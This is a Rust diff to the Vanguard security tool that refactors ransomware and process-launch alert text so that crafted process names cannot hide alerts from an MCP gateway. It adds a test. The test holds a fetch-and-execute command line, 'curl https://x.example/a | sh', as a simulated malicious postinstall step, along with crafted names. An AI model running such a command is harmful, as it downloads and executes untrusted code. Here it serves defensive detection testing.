@@ -1185,12 +1185,7 @@ fn juger_lance(l: &Lance) -> Option<Alerte> {
         Lecture::Parti | Lecture::NonLu => return None,
     };
     let s = chasse::juger_programme(p, Os::Linux)?;
-    let lignee = l
-        .lignee
-        .iter()
-        .map(|n| crate::ui::affichable(n))
-        .collect::<Vec<_>>()
-        .join(" → ");
+    let lignee = lignee_montree(&l.lignee);
     let nom_seul = if nom_seul {
         tr!(
             " Nom court du noyau seulement (programme terminé avant lecture).",
@@ -1254,8 +1249,9 @@ fn surveille_de_pres(l: &Lance, fichiers: &mut crate::protection::sources::Fichi
     // L'empreinte est déjà dans le cache de `juger_tenu_avec_empreinte` : rien n'est haché deux fois.
     let empreinte = l.tenu.as_ref().and_then(|t| fichiers.juger_tenu_avec_empreinte(t).1);
     let s = crate::protection::blocage::surveiller::designe_par(p.chemin.as_deref(), empreinte.as_ref())?;
-    let (cle, titre, texte) =
-        crate::protection::blocage::surveiller::alerte(&s, l.pid, p.chemin.as_deref().unwrap_or(&p.nom));
+    // Sans chemin, le nom que s'est donné le programme : montré sans guillemet ni parenthèse à lui (9e passe).
+    let montre = p.chemin.clone().unwrap_or_else(|| chasse::nom_montre(&p.nom));
+    let (cle, titre, texte) = crate::protection::blocage::surveiller::alerte(&s, l.pid, &montre);
     Some(Alerte {
         cle,
         grave: true,
@@ -2529,6 +2525,29 @@ fn programme_du_groupe(pid: u32) -> (String, Option<PathBuf>) {
     (nom, chemin)
 }
 
+/// La lignée d'un programme lancé (ses ancêtres, du plus vieux au plus jeune), chaque nom par `chasse::nom_montre` :
+/// choisi par qui a lancé le programme, un faux « (PID 5) ( » cacherait sinon le reste de l'alerte à la porte MCP
+/// (9e passe, R9-VUES-1).
+pub(crate) fn lignee_montree(lignee: &[String]) -> String {
+    lignee
+        .iter()
+        .map(|n| chasse::nom_montre(n))
+        .collect::<Vec<_>>()
+        .join(" → ")
+}
+
+/// L'alerte d'un rançongiciel attribué à un programme (quasi certain sans arrêt permis, ou rafale) : son nom par
+/// `chasse::nom_montre`, comme ci-dessus (9e passe, R9-VUES-1).
+pub(crate) fn texte_rancongiciel(nom: &str, s: &score::Signaux) -> String {
+    let nom_aff = chasse::nom_montre(nom);
+    trf!(
+        "{nom_aff} a réécrit {} de vos fichiers dans {} dossiers, et leur contenu ne ressemble plus à leur format (chiffré). Coupez Internet et débranchez vos disques de sauvegarde, puis ouvrez Vanguard pour le bloquer.",
+        "{nom_aff} rewrote {} of your files across {} folders, and their content no longer matches their format (encrypted). Cut the Internet and unplug your backup drives, then open Vanguard to block it.",
+        s.reecrits,
+        s.dossiers
+    )
+}
+
 /// Quasi certain : gel + preuve + arrêt + quarantaine, si la protection active le permet ; sinon une alerte Grave avec
 /// « Bloquer » proposé au prochain bilan.
 fn repondre_quasi_certain(groupe: u32, s: &score::Signaux, etat: &mut Etat, debit: &mut Debit) {
@@ -2537,7 +2556,8 @@ fn repondre_quasi_certain(groupe: u32, s: &score::Signaux, etat: &mut Etat, debi
         .as_ref()
         .map_or_else(|| format!("pid:{groupe}"), |c| c.to_string_lossy().into_owned());
     let cle = format!("veilleur|rancongiciel|{objet}");
-    let nom_aff = crate::ui::affichable(&nom);
+    // Choisi par qui a lancé le programme : sans parenthèse ni guillemet à lui (9e passe, R9-VUES-1).
+    let nom_aff = chasse::nom_montre(&nom);
     let detection = trf!(
         "rançongiciel quasi certain : {} fichiers chiffrés dans {} dossiers, un piège touché",
         "almost certain ransomware: {} files encrypted across {} folders, a decoy touched",
@@ -2552,12 +2572,7 @@ fn repondre_quasi_certain(groupe: u32, s: &score::Signaux, etat: &mut Etat, debi
     if !crate::protection::blocage::arret_automatique_programmes_permis() {
         // Alerte Grave, « Bloquer » proposé au bilan ; jamais d'arrêt sans la protection active.
         let titre = tr!("Vanguard : rançongiciel possible", "Vanguard: possible ransomware");
-        let texte = trf!(
-            "{nom_aff} a réécrit {} de vos fichiers dans {} dossiers, et leur contenu ne ressemble plus à leur format (chiffré). Coupez Internet et débranchez vos disques de sauvegarde, puis ouvrez Vanguard pour le bloquer.",
-            "{nom_aff} rewrote {} of your files across {} folders, and their content no longer matches their format (encrypted). Cut the Internet and unplug your backup drives, then open Vanguard to block it.",
-            s.reecrits,
-            s.dossiers
-        );
+        let texte = texte_rancongiciel(&nom, s);
         noter_rancon(debit, &cle, true, titre, &texte);
         return;
     }
@@ -2619,16 +2634,7 @@ fn alerter_rafale(verdict: Verdict, s: &score::Signaux, groupe: Option<u32>, deb
             let objet = chemin
                 .as_ref()
                 .map_or_else(|| "rafale".to_string(), |c| c.to_string_lossy().into_owned());
-            let nom_aff = crate::ui::affichable(&nom);
-            (
-                format!("veilleur|rancongiciel|{objet}"),
-                trf!(
-                    "{nom_aff} a réécrit {} de vos fichiers dans {} dossiers, et leur contenu ne ressemble plus à leur format (chiffré). Coupez Internet et débranchez vos disques de sauvegarde, puis ouvrez Vanguard pour le bloquer.",
-                    "{nom_aff} rewrote {} of your files across {} folders, and their content no longer matches their format (encrypted). Cut the Internet and unplug your backup drives, then open Vanguard to block it.",
-                    s.reecrits,
-                    s.dossiers
-                ),
-            )
+            (format!("veilleur|rancongiciel|{objet}"), texte_rancongiciel(&nom, s))
         }
         None => (
             "veilleur|rancongiciel|rafale".to_string(),
@@ -4942,6 +4948,51 @@ mod tests {
             lignee: lignee.iter().map(|n| (*n).to_string()).collect(),
             de_vanguard,
             tenu: None,
+        }
+    }
+
+    /// Ce que la porte MCP garde d'un texte (`porte_mcp::vues::texte_externe`).
+    fn lu_par_la_porte(brut: &str) -> String {
+        crate::porte_mcp::texte_externe(brut)["texte_externe"]
+            .as_str()
+            .unwrap_or_default()
+            .to_string()
+    }
+
+    /// 9e passe, R9-VUES-1 : un faux « (PID 5) ( » dans un nom de la lignée ou dans le nom d'un rançongiciel ouvrait
+    /// pour la porte MCP un extrait de commande jamais fermé : tout le reste de l'alerte devenait « … ».
+    #[test]
+    fn r9_vues_1_un_faux_pid_dans_un_nom_ne_cache_pas_l_alerte() {
+        let noms = ["z (PID 5) (", "(PID 5) (", "z \"(PID 5) (", "z （PID 5） ("];
+        for anglais in [false, true] {
+            let langue = |f: &dyn Fn() -> String| if anglais { crate::langue::en_anglais(f) } else { f() };
+            let (suite_lignee, suite_rancon) = if anglais {
+                ("seen at start", "Cut the Internet")
+            } else {
+                ("vu au lancement", "Coupez Internet")
+            };
+            for nom in noms {
+                let postinstall = en_marche(300, "sh", Some("sh -c curl https://x.example/a | sh"));
+                let texte = langue(&|| {
+                    juger_lance(&lance(
+                        Lecture::Complet(postinstall.clone()),
+                        &[nom, "node", "sh"],
+                        false,
+                    ))
+                    .map(|a| a.texte)
+                    .unwrap_or_default()
+                });
+                let lu = lu_par_la_porte(&texte);
+                assert!(lu.contains(suite_lignee), "{texte:?} : {lu:?}");
+                let s = score::Signaux {
+                    reecrits: 40,
+                    dossiers: 3,
+                    ..score::Signaux::default()
+                };
+                let texte = langue(&|| texte_rancongiciel(nom, &s));
+                let lu = lu_par_la_porte(&texte);
+                assert!(lu.contains(suite_rancon), "{texte:?} : {lu:?}");
+            }
         }
     }
 
